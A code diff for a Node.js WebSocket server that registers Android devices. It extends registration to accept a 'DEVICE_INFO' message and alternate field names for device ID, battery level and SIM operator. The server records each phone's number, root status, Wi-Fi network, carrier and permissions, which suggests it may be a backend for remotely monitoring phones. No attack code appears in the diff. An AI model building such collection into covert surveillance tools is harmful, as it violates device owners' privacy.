@@ -296,8 +296,9 @@ deviceWss.on('connection', (ws, req) => {
     try { msg = JSON.parse(data); } catch { return; }
 
     // ── Device registration ──────────────────────────────────────────────────
-    if (msg.type === 'register' || msg.action === 'REGISTER') {
-      deviceId = msg.deviceId || msg.id || crypto.randomUUID();
+    if (msg.type === 'register' || msg.action === 'REGISTER' ||
+        (msg.type === 'DEVICE_INFO' && !deviceId)) {
+      deviceId = msg.deviceId || msg.device_id || msg.id || crypto.randomUUID();
 
       const info = {
         alias:          null,
@@ -305,9 +306,9 @@ deviceWss.on('connection', (ws, req) => {
         androidVersion: msg.androidVersion || msg.android_version  || null,
         manufacturer:   msg.manufacturer                           || null,
         phoneNumber:    msg.phoneNumber    || msg.phone_number      || null,
-        batteryLevel:   msg.batteryLevel   || null,
+        batteryLevel:   msg.batteryLevel   || msg.battery_level  || null,
         isRooted:       !!msg.isRooted,
-        carrier:        msg.carrier                                || null,
+        carrier:        msg.carrier        || msg.sim_operator     || null,
         country:        msg.country                                || null,
         wifiSsid:       msg.wifiSsid       || msg.wifi_ssid         || null,
         permissions:    msg.permissions                            || {},
@@ -409,6 +410,7 @@ deviceWss.on('connection', (ws, req) => {
         break;
       }
 
+      case 'DEVICE_INFO':
       case 'device_info': {
         const info = msg.data || msg;
         db.query(`UPDATE devices SET battery_level=$1, wifi_ssid=$2, carrier=$3, is_online=TRUE, last_seen=NOW() WHERE id=$4`,
